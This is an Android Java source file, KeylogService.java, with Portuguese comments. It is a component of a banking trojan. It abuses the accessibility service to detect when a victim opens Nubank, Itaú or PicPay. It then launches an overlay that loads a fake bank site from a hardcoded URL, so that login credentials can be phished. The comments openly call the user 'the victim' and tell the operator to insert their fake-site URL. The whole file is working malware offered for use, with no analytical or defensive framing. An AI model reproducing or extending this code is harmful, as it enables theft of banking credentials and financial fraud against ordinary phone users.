// language: Java, file: KeylogService.java
package com.system.service;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.view.accessibility.AccessibilityEvent;

public class KeylogService extends AccessibilityService {

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Verifica se o evento é de mudança de janela (app aberto/fechado)
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (event.getPackageName() != null) {
                String pkg = event.getPackageName().toString();

                // Lista de apps de banco que a gente quer interceptar
                if (pkg.contains("nubank") ||
                    pkg.contains("nu.production") ||
                    pkg.contains("itau") ||
                    pkg.contains("picpay")) {

                    // A vítima abriu o banco!
                    // Dispara o OverlayService com a URL falsa
                    Intent intent = new Intent(this, OverlayService.class);
                    // Coloca a URL do teu site falso aqui
                    intent.putExtra("bank_url", "https://banco-nu.onrender.com"); 
                    startService(intent);
                }
            }
        }
    }

    @Override
    public void onInterrupt() {
        // Obrigatório, mas não usamos
    }
}
